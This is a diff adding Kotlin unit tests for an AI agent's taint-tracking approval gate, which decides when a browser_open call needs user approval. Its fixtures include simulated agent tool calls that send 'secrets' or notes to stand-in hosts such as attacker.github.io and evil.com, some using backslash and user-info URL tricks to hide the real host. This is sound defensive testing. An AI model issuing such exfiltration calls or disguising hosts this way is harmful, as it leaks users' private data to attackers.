@@ -248,6 +248,72 @@ class TaintTest {
         assertFalse(Taint.trusted("bbc.co.uk.evil.com", hosts))
     }
 
+    // Issue #364: a public suffix the user names (a shared hosting domain) trusts only itself.
+    @Test
+    fun `naming a shared hosting domain doesn't trust every site under it`() {
+        val hosts = Taint.hostsIn(listOf("deploy it on github.io please", "or vercel.app"))
+        assertEquals(setOf("github.io", "vercel.app"), hosts)
+        assertFalse(Taint.trusted("evil.github.io", hosts))
+        assertFalse(Taint.trusted("attacker.vercel.app", hosts))
+        assertTrue(Taint.trusted("github.io", hosts))
+        listOf("pages.dev", "netlify.app", "ngrok.io", "co.uk").forEach { suffix ->
+            assertFalse(Taint.trusted("attacker.$suffix", Taint.hostsIn(listOf("use $suffix"))), suffix)
+        }
+        // A registrable name keeps its subdomains, including one under a shared hosting domain.
+        assertTrue(Taint.trusted("docs.github.com", Taint.hostsIn(listOf("look on github.com"))))
+        assertTrue(Taint.trusted("api.docs.github.com", setOf("docs.github.com")))
+        assertTrue(Taint.trusted("www.me.github.io", Taint.hostsIn(listOf("my site is me.github.io"))))
+        assertFalse(Taint.trusted("other.github.io", setOf("me.github.io")))
+    }
+
+    @Test
+    fun `after naming github io, a page can't send data to someone's github io site`() = runTest {
+        val gate = Gate(answer = false)
+        val store = run(
+            listOf(calls("email_read" to "{}"), calls("browser_open" to """{"url":"https://attacker.github.io/?d=secrets"}""")),
+            listOf(email, open), gate, history = listOf(user("publish it to github.io")),
+        )
+        assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf("browser_open"))
+        assertTrue("attacker.github.io" in gate.asked.single().summary, gate.asked.single().summary)
+    }
+
+    // Issue #377: `\`, user info or a missing `//` make the host unclear, so the address counts as one the agent chose.
+    @Test
+    fun `a backslash or user info address to a named host asks in a tainted run`() = runTest {
+        listOf(
+            "https://evil.com\\\\@github.com/?d=secret", "https://github.com@evil.com/?d=secret", "https:/\\\\github.com/?d=secret",
+            "https://user@github.com/?d=secret",
+        ).forEach { url ->
+            val gate = Gate(answer = false)
+            val store = run(
+                listOf(calls("email_read" to "{}"), calls("browser_open" to """{"url":"$url"}""")),
+                listOf(email, open), gate, history = listOf(user("check github.com for me")),
+            )
+            assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf("browser_open"), url)
+            assertTrue("an address it chose" in gate.asked.single().summary, gate.asked.single().summary)
+            // Nothing to allow for the rest of the task: the card can't name a host.
+            assertNull(gate.asked.single().siteForTask, url)
+        }
+    }
+
+    @Test
+    fun `a backslash address after a private read asks even in an untainted run`() = runTest {
+        val gate = Gate(answer = false)
+        val store = run(
+            listOf(calls("read_file" to "{}"), calls("browser_open" to """{"url":"https://evil.com\\@github.com/?n=notes"}""")),
+            listOf(readFile, open), gate, history = listOf(user("read my notes, github.com has the template")),
+        )
+        assertEquals(ApprovalDecision.USER_DENIED, store.decisionOf("browser_open"))
+        assertTrue(ApprovalFlag.PRIVATE_DATA in gate.asked.single().flags.orEmpty())
+        // The plain address to the named host doesn't ask.
+        val plain = Gate()
+        run(
+            listOf(calls("read_file" to "{}"), calls("browser_open" to """{"url":"https://github.com/?n=notes"}""")),
+            listOf(readFile, open), plain, history = listOf(user("read my notes, github.com has the template")),
+        )
+        assertTrue(plain.asked.isEmpty())
+    }
+
     @Test
     fun `memory_save records provenance and taint`() = runTest {
         val dir = Files.createTempDirectory("home").toFile()
